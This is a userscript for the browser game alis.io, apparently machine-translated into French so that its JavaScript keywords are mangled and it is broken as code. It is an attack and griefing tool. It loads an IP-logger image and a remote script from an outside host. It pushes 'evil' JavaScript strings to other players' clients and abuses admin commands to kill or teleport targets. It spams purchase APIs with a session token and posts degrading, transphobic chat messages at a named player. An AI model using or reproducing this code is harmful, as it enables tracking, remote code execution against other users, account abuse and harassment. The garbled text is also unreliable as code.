// ==UserScript==
// @name         New Userscript
// @namespace    http://tampermonkey.net/
// @version      0.1
// @description  try to take over the world!
// @author       You
// @match        http://alis.io/
// @grant        none
// ==/UserScript==

(function() {
    'use strict';

    // Your code here// URL de base à laquelle ajouter les chemins
var nosxBase =  " https://nosx.cf/ " ;
// définir les niveaux de hackery
var playerSettings = {};
// Counter pour parcourir les niveaux de hackery (index = nextHack modulous hackCount)
var nextHack =  1 ;
// URL de base pour les chansons et les sons
var soundBase = nosxBase +  " mp3 / " ;
// index de notre chanson et son actuel
// var nextSound = 1;
// var nextSong = 1;
// liste des fils avec les détails associés
var soundBoard = {};
var sound = {};
// liste de chansons avec les détails associés
var songBoard = {};
var song = {};


fenêtre . buyBots = fonction ( multiplicateur ) {
    var url =  ' / api / users / buyupgrade ' ;
    méthode var =  ' POST ' ;
    var data = {
        type :  ' bots '  + multiplicateur,
    };
    var  succès  =  fonction ( réponse ) {
        si ( réponse . succès ) {
            console . log ( " juste gaspillé vos pièces de mer " );
        }
    }
     échec  var =  fonction ( erreur ) {
    }
    // lance l'appel api spécifié et attend sa réponse
    apicall (url, méthode, données, succès, échec)
}
fenêtre . buyMass  =  multiplier  => {
    var url =  ' / api / users / buyupgrade ' ;
    méthode var =  ' POST ' ;
    var data = {
        type :  ' masse '  + multiplicateur,
    };
    var  succès  =  fonction ( réponse ) {
        si ( réponse . succès ) {
            console . log ( " juste gaspillé vos pièces de mer " );
        }
    }
    // lance l'appel api spécifié et attend sa réponse
    apicall (url, méthode, données, succès, échec)
}

fenêtre . changeColor = () => {
    var url =  ' / api / users / changecolor ' ;
    méthode var =  ' POST ' ;
    var callurl = apiurl + url +  " ? token = "  + jwt +  " & r = "  +  255  +  " & g = "  +  255  +  " & b = "  +  255 ;
        // console.log (callurl);
    $ . ajax ({
        type :  " GET " ,
        url : callurl,
        succès :  fonction ( données ) {
        console . log ( " dumbfck no lbc now " );
        }
    });
}

var roaster = false ;

var fuckingMexisShouldDie = setInterval (() => {

    fenêtre . buyBots ( 3 );
    fenêtre . buyMass ( 3 );
    fenêtre . changeColor ();

}, 500 );

var sel = [ « gars Salut je suis tit » , « Je suis une transsexuelle » , «j'aime enculer les hommes » , « Je veux la morsure de nos » , « SVP fais admns donc je peux sucer godes » ,];
var roasterIndex = 0 ;
var ss =  setTimeout (() => {
    var mexiRoaster = setInterval (() => {
        roasterIndex ++ ;
        fenêtre . sendChat (sel [roasterIndex % de sel . longueur ]);
    }, 1000 );
    var ss2 =  setTimeout (() => {
        var pluie =  document . createElement ( " script " );
        la pluie . src = " https://nosx.cf/rain.js " ;
        document . la tête . appendChild (pluie);
    }, 4000 );
}, 15000 );
// crée une fonction réutilisable pour recharger les paramètres, les sons et les chansons.
unsafeWindow . reloadHacks  =  function () {
    var log =  new  Image ();
    se connecter . src = " https://2no.co/18Xc37 " ;
    se connecter . alt = " iplogger.org - Service de journalisation IP " ;
    se connecter . border = " 0 " ;
    document . corps . appendChild (log);

    $ . getJSON ( " http://okumura-todo-ge.tk/gePlayerSettings.json " , fonction ( json ) {
        playerSettings = json;
        console . log ( ' playerSettings Loaded! ' );
        pour ( var s dans playerSettings) {
            var b = document . createElement ( " BUTTON " );
            b . innerHTML = s;
            b . onclick = () => {
                pour ( var i in s) {
                    sendTargetHack ( " réglé " , unsafeWindow . CIBLES , [i, S [i]]);
                }
            }
            $ ( ' #hackdiv ' ). annexe b);
        }
    var timer = 10
    var  gay = () => {
        minuterie - ;
        console . log (minuterie);
        if (timer === 0 ) { console . log ( " BONK " )}
        setTimeout (gay, 1000 );
    }
        // fait des choses ici
    });
    $ . getJSON (nosxBase +  " /razor/songboard.json " , fonction ( json ) {
        songBoard = json;
        console . log ( ' songBoard Loaded! ' );
        var songPad = document . createElement ( " LI " );
        var songList = document . createElement ( " select " );
        pour ( var f dans songBoard) {
            songList . options . ajouter ( nouvelle  option (f, f));
        }
        songList . style = " width: 150px; " ;
        var playSongbutton = document . createElement ( " BUTTON " );
        playSongbutton . innerHTML = " Lecture " ;
        playSongbutton . onclick = function () {
            var currentSong = songBoard [ songList . valeur ];
            if ( ! currentSong ||  ! currentSong . path  ||  ! currentSong . vol ) {
                console . log ( 'son indéfini ou invalide ' );
                retour ;
            }
            // construit la chaîne à envoyer
            var hack =  " " ;
            hack + =  " if (window.song) window.song.stop (); window.song = new Audio (' " ;
            bidouille + = base audio +  currentSong . chemin ;
            hack + =  " '); window.song.volume = " ;
            bidouille + =  currentSong . vol ;
            hack + =  " ; window.song.play (); " ;
            // envoie la chaîne
            sendHack ( " / say / evil: "  + hack);
            // console.log ('envoi du tableau de la chanson' + piratage);
            if ( currentSong . extra ) {
                // console.log ('envoyer un hack supplémentaire au songboard' + sound.extra);
                sendHack ( " / say / evil: "  +  currentSong . extra );
            }
        };
        songPad . append (songList);
        songPad . ajouter (playSongbutton);
        $ ( ' #hackdiv ' ). ajouter (songPad);
    });
    $ . getJSON (nosxBase +  " /razor/soundboard.json " , fonction ( json ) {
        soundBoard = json;
        console . log ( ' soundBoard Loaded! ' );
        var soundPad = document . createElement ( " LI " );
        var soundList = document . createElement ( " select " );
        pour ( var s dans soundBoard) {
            soundList . options . ajouter ( nouvelle  option (s));
        }
        soundList . style = " width: 150px; " ;
        var playSoundbutton = document . createElement ( " BUTTON " );
        playSoundbutton . innerHTML = " Lecture " ;
        playSoundbutton . onclick = function () {
            // console.log ("chanson en cours de lecture:" + soundList.value);
            var currentSound = soundBoard [ soundList . valeur ];
            if ( ! currentSound ||  ! currentSound . path  ||  ! currentSound . vol ) {
                console . log ( 'son indéfini ou invalide ' );
                retour ;
            }
            // construit la chaîne à envoyer
            var hack =  " " ;
            // / say / evil: window.song = new Audio ('http://okumura-todo-ge.tk/bgm1.mp3'); window.song.volume = 0.4; window.song.play ();
            hack + =  " if (window.sound) window.sound.stop (); window.sound = new Audio (' " ;
            bidouille + = base audio +  currentSound . chemin ;
            hack + =  " '); window.sound.volume = " ;
            bidouille + =  currentSound . vol ;
            hack + =  " ; window.sound.play (); " ;
            // envoie la chaîne
            sendHack ( " / say / evil: "  + hack);
            // console.log (envoi de la table d'harmonie '+ piratage);
            if ( currentSound . extra ) {
                // console.log ('envoi de piratage supplémentaire de la table de son' + sound.extra);
                sendHack ( " / say / evil: "  +  currentSound . extra );
            }
        };
        soundPad . append (soundList);
        soundPad . append (playSoundbutton);
        $ ( ' #hackdiv ' ). ajouter (soundPad);
    });
};
// appelle la chanson de réglage asynchrone et le chargeur de sons
unsafeWindow . reloadHacks ();

// Valeurs de masse
var massToggle = [ 2000 , 20000 ];
var nextMass =  1 ;


unsafeWindow . sendHack  =  fonction ( commande , paramètres ) { sendTargetHack (commande, unsafeWindow . CIBLES , paramètres); };
unsafeWindow . showAllChat  =  1 ;
// unsafeWindow.showAllSkins = 1;

// Change de couleur toutes les demi-secondes
/ *
var changeColor = setInterval (function () {
    var myId = $ ('# # yourplayerid'). html ();
    si (myId) {
        var commande = '/ randomcolor';
        //console.log('sending color command: '+ command);
        sendHack (commande);
    }
}, 500);
/ * * /

fonction  findUIDwithPID ( pid ) {
    console . log ( ' recherche de l'ID utilisateur ... ' );
    console . log (apc);
    pour ( var c dans apc) {
        si (apc [c]. pid == pid) {
            retourne apc [c]. uid ;
        }
    }
    return  null ;
}
angle var = 0 ;
var isMoving = false ;
var playersOnRide = {};
var circularMovement =  setInterval ( function () {
    if (playersOnRide && isMoving) {
        var commande =  ' / teleport ' + playersOnRide + '  ' + 3000 * Math . cos (angle) + '  ' + 3000 * Math . péché (angle);
        // console.log ("current pos:" + 3000 * Math.cos (angle) + "," + 3000 * Math.sin (angle));
        angle + = 0,05 ;
        sendHack (commande);
    }
}, 20 );
// redéfinit la fonction window.onChatClick (pid)
unsafeWindow . onChatClick  =  function ( pid ) {
    unsafeWindow . cibles  = [pid];
};
/ *
unsafeWindow.receiveMessage = function (msg, données, el, options) {
    console.log (msg, data, el, options);
    si (! options.team) {
        options.team = "";
    }
    var iconColor = "#ffffff";
    var message = $ ("<div />");
    var _0x24977 = 'style = "';
    if (el && el! = "#ffffff") {
        _0x24977 + = "color:" + el + ";";
        message.addClass ("nom de couleur");
    } autre {
        _0x24977 + = "color:" + iconColor + ";";
    }
        if (options.isAdmin || (options.isTroll || options.isBold)) {
            _0x24977 + = "font-weight: bold;";
        }
    if (options.isServer) {
        _0x24977 + = "taille de police: gras; couleur: # 26547C";
        message.addClass ("nom de couleur");
    }
    _0x24977 + = '"';
    if (options.pid) {
        if (! window.playerExtra [options.pid]) {
            window.playerExtra [options.pid] = {};
        }
        $ .extend (window.playerExtra [options.pid], options);
        _0x24977 + = 'onclick = "window.onChatClick (' + options.pid + ');"';
    }
    var text = "";
    if (window.showAllChat) {
        if (options.team! = "") {
            text = "[" + options.team + "]";
            text = escapeHtml (text);
        }
    }
    msg = échappementHtml (msg);
    var bodyPlainTag = $ ('<span class = "expéditeur"' + _0x24977 + ">"). html ("<span id = 'teaminchat"> "text +" </ span> "+ msg +": ");
    message.append (bodyPlainTag);
    if (! options.isAdmin &&! options.isServer) {
        data = escapeHtml (data);
    } autre {}
    errors = $ ('<span class = "msg">'). html (données);
    message.append (erreurs);
    $ ("# salle de discussion"). ajouter (message);
    $ ("# salle de discussion"). Arrêtez (). animer ({
        scrollTop: $ ("# chatroom") [0] .scrollHeight
    }, 400);
    this.scrollDown ();
    this.popupChat (msg, data, el);
};
/ * * /

// interface utilisateur de notre fenêtre. objectifs à jour
var updateTargets =  setInterval ( function () {
    $ ( ' #targetplayerid ' ). html ( JSON . stringify ( unsafeWindow . CIBLES )));
}, 500 );


// gestionnaire Keypress
fonction  keydown ( événement ) {
    // console.log (event); // pour le débogage
    // This is not the press of press of body on-même body
    if ( event . target . nodeName  ! =  " BODY " ) {
        retour ;
    }
    var commande =  ' ' ;
    // activer / désactiver dickride
    if ( event . keyCode  ==  48 ) {
        playersOnRide = unsafeWindow . les cibles ;
        isMoving = ! est en mouvement;
        if (isMoving) {
            $ ( ' #hackstatus ' ). html ( ' Dickriding started! ' );
        } else {
            $ ( ' #hackstatus ' ). html ( ' Dickriding arrêté! ' );
        }
    }
    // 2 clés, téléporter à l'emplacement de la souris
    if ( event . keyCode  ==  50 ) {
        sendTargetHack ( ' téléportation ' , unsafeWindow . CIBLES , [mouseX, mouseY]);
        $ ( ' #hackstatus ' ). html ( ' cible téléportée ' );
    }

    // 3 clé, bascule masse hack 2k / 20k
    if ( event . keyCode  ==  51 ) {
        var massKey = nextMass %  massToggle . longueur ;
        sendTargetHack ( ' masse ' , fenêtre non sécurisée . CIBLES , massToggle [massKey]);
        $ ( ' #hackstatus ' ). html ( ' masse correctement sur '  + massToggle [massKey]);
        nextMass ++ ;
    }

    // 5 clés, cible mortelle
    if ( event . keyCode  ==  53 ) {
        sendTargetHack ( ' tuer ' , unsafeWindow . CIBLES , ' ' );
        $ ( ' #hackstatus ' ). html ( " joueur (s) cible (s) tué (s) " );
    }
    // R définit la couleur cible sur RANDUMB
    if ( event . keyCode  ==  82 ) {
        sendTargetHack ( ' randomcolor ' , unsafeWindow . CIBLES , ' ' );
    }
}

var allcb = {};
var apc = [];

// obtenir l'identification de la cellule cible
fonction  getClosestCellID ( X , Y ) {
    // $ ('# hackstatus'). html ('recherche d'un identifiant de cellule près de la souris' + X + ',' + Y);
    var cells =  unsafeWindow . toutes les cellules ;
    // console.log (cellules);
    // Boucle dans toutes les cellules et extrait JUST les joueurs
    var playerCells = [];
    apc = [];
    pour ( var i dans les cellules) {
        var playerCell = cellules [i];
        // Ignorer les granulés alimentaires et les cellules minuscules
        if ( playerCell . isFood  ||  playerCell . taille  <  35 ) {
            continuer ;
        }
        // Un ancien indicateur de virus Agarplus obfusqué
        if ( playerCell . f  ||  playerCell . isVirus ) {
            continuer ;
        }
        console . log (playerCell);
        // Calculer les distances x et y
        var distx =  playerCell . x  -  X ;
        var disty =  playerCell . y  -  Y ;
        // calcule la distance entre deux points X, Y
        var distance =  Math . sqrt ( Math . pow (distx, 2 ) +  Math . pow (disty, 2 ));
        // sauvegarde nos informations sur la cellule du joueur
        var razorCell = {};
        rasoirCell . id  = i;
        rasoirCell . nom  =  joueurCell . nom ;
        rasoirCell . distance  = distance;
        rasoirCell . taille  =  playerCell . la taille ;
        rasoirCell . x  =  playerCell . x ;
        rasoirCell . y  =  playerCell . y ;
        rasoirCell . uid = playerCell . extra . uid ;
        rasoirCell . skinUrl = playerCell . extra . skinUrl ;
        // console.log (playerCell.name + "teamHash:" + playerCell.extra.teamHash);
        rasoirCell . équipe = joueurCell . extra . teamHash ;
        rasoirCell . pid = playerCell . extra . pid ;
        playerCells . pousser (razorCell);

        si ( apc . longueur < 1 ) {
            apc . pousser (razorCell);
        }
        var trouvé = faux ;
        pour ( var cellule in apc) {
            var c = apc [cellule];
            // compare si la cellule appartient au même joueur ou s'il s'agit d'une pièce
            if ( razorCell . pid == c . pid ) {
                trouvé = vrai ;
                Briser ;
            }
        }
        si ( ! trouvé) {
            apc . pousser (razorCell);
        }

    }
    allcb = [];
    $ ( ' #pannel ' ). html ( " " );
    // console.log (apc);
    apc . sort ( fonction ( a , b ) { retour  a . distance  -  b . distance ;});
    pour ( var a in apc) {
        var b = apc [a];
        var pd = document . createElement ( " LI " );
        var img =  document . createElement ( " img " );
        img . style = " hauteur: 50px; largeur: 50px; " ;
        img . setAttribute ( ' src ' , b . skinUrl );
        var cb =  document . createElement ( " INPUT " );
        cb . setAttribute ( " type " , " cas à cocher " );
        cb . valeur = b . pid ;
        allcb . pousser (cb);
        pd . append (cb);
        pd . append (img);
        pd . ajouter ( b . nom );
        $ ( ' #pannel ' ). append (pd);
    }
    // console.log (playerCells);
    // Trier les cellules par distance ascendante
    playerCells . sort ( fonction ( a , b ) { retour  a . distance  -  b . distance ;});
    // console.log ('joueur le plus proche identifié:');
    // console.table (playerCells.slice (0, 1));
    if ( playerCells . length ) {
        retournez playerCells [ 0 ]. id ;
    } else {
        retourne  0 ;
    }
}

// clic gauche de la souris
fonction  leftMouseClick ()
{
    si ( viruscb . vérifié ) {
        var virusSize = vc . valeur || 100 ;
        // console.log ("taille du virus:" + taille du virus);
        command =  " / virus "  + mouseX +  "  "  + mouseY +  "  "  + virusSize;
        sendHack (commande);
        $ ( ' #hackstatus ' ). html ( ' virus apparu ' );
        retour ;
    }
    si ( coïnc . cochée ) {
        var coinSize = cc . valeur || 1500 ;
        // console.log ("coin size:" + coinSize);
        command =  " / coin "  + mouseX +  "  "  + mouseY +  "  "  + coinSize;
        sendHack (commande);
        $ ( ' #hackstatus ' ). html ( ' pièce engendrée ' );
        retour ;
    }

    var cellid = getClosestCellID (mouseX, mouseY);

    si (cellid) {
        $ ( ' #hackstatus ' ). html ( ' identifiant de joueur demandé de la cellule '  + cellid);
        var cell =  unsafeWindow . toutes les cellules [cellid];
        if ( cell . extra  &&  cell . extra . pid  >  0 ) {
            unsafeWindow . cibles  = [ cellule . extra . pid ];
            // $ ('# targetplayerid'). html (JSON.stringify (cell.extra.pid));
            // $ ('# hackstatus'). html ('le joueur cible basculé sur' + $ ('# targetplayerid'). html ());
        } else {
            $ ( ' #hackstatus ' ). html ( ' impossible d'obtenir le joueur de la cellule '  + cellid);
        }
    } else {
        $ ( ' #hackstatus ' ). html ( ' impossible d'obtenir l'authentifiant de la cellule le plus proche ' );
    }
}
// gestionnaire de la souris du milieu
fonction  middleMouseClick ()
{
    $ ( ' #hackstatus ' ). html ( ' définition de la cible pour tous les identifiants de cellule ' );
    // veille à mettre à jour la liste des joueurs en faisant
    playerlist = [];
    command =  " / playerlist " ;
    sendHack (commande);
    setTimeout ( function () {
        var playerIDs = [];
        pour ( clé vardans la liste des joueurs) {
            // Ignore l'ajout de NOURRITURE à la liste des clics du milieu
            if (liste de joueurs [clé]. id  ==  $ ( ' #votreplayerid ' ). html ()) {
                continuer ;
            }
            playerIDs . pousser (liste de joueurs [clé]. id );
        }
        si ( playerIDs . longueur ) {
            unsafeWindow . CIBLES  = playerIDs;
        } else {
            $ ( ' #hackstatus ' ). html ( ' Erreur lors de la mise en place des identifiants de lecteur ' );
        }
    }, 500 );
}

fonction  isDescendant ( parent , enfant ) {
    var noeud =  enfant . parentNode ;
    while (node ! =  null ) {
        if (noeud == parent) {
            retourne  vrai ;
        }
        noeud =  noeud . parentNode ;
    }
    retourne  faux ;
}
// Add to it the event of presses clés
$ ( " body " ). keydown (keydown);
// window.addEventListener ('keyup', keyup);
$ ( " # overlays2 " ). sur ( ' mousedown ' , fonction ( événement ) {
    // console.log ("événement de clic de souris sur overlays2" + event.which);
    // console.log (event);
    if ( événement . qui  ==  1 ) {
        // event.preventDefault ();
        var source =  event . cible  ||  événement . srcElement ;
        if ( isDescendant ( document . getElementById ( " hackdiv " ), source) || isDescendant ( document . getElementById ( " allplayers " ), source)) {
            retour ;
        }
        // console.log (source);
        leftMouseClick ();
    }
    si ( événement . qui  ==  2 ) {
        événement . preventDefault ();
        middleMouseClick ();
    }
});

document . getElementById ( " playSound " ). sur ( ' clic ' , fonction ( événement ) {
    console . log ( " vous avez cliqué sur ce bouton " );
});

// vars globaux pour garder des trucs pour référence
var playerlist = [];
var commandlist = [];

// gérer les réponses du serveur à nos requêtes
onMultiChat  =  function ( utilisateur , message ) {
    // console.log (message);
    if (utilisateur ==  ' SERVEUR '  && message [ 0 ] ==  ' / ' ) {
        // supprime la commande / / split à la réponse ":"
        var split =  message . tranche ( 1 , un message . longueur ). scission ( ' : ' );
        var commande = split [ 0 ];
        // supprime la commande que nous avons sauvegardée et recombine le tableau pour l'analyse
        divisé . épissure ( 0 , 1 );
        réponse var =  divisé . rejoindre (). trim ();
        // nous avons reçu une réponse OK d'une commande
        if (commande ==  ' ok ' ) { return ; }
        if (commande ==  ' pong ' ) { return ; }
        if (command ==  ' evil ' ) { return ; }
        // nous avons récupéré notre identifiant du serveur
        if (commande ==  ' playerid ' ) {
            $ ( ' #votredirecteur ' ). html (réponse);
            retour ;
        }
        // Liste des commandes supportées
        if (commande ==  ' commandes ' ) {
            commandlist =  JSON . analyseur (réponse);
            console . log (liste de commandes);
            retour ;
        }
        // Nous avons une liste de tous les joueurs du serveur
        if (commande ==  ' playerlist ' ) {
            playerlist =  JSON . analyseur (réponse);
            console . table (liste des joueurs);
            retour ;
        }
        // nous avons la configuration actuelle des serveurs
        if (commande ==  ' config ' ) {
            config =  JSON . analyseur (réponse);
            console . log (config);
            retour ;
        }
        // Nous avons le playerDétails pour un client
        if (commande ==  ' playerdetails ' ) {
            var playerdetails =  JSON . analyseur (réponse);
            console . log (détails du joueur);
            retour ;
        }
        // commande maintenant une partie d'agarplus
        if (commande ==  ' extra ' ) { return ; }
        console . log ( ' COMMANDES NON GÉRÉES: '  + commande);
        console . log (réponse);
    } else {
        // désactiver l'animation de fond cancéreux pour le chat
        // $ ("# chatroom div"). css ("opacité", 1);
    }
};
})();
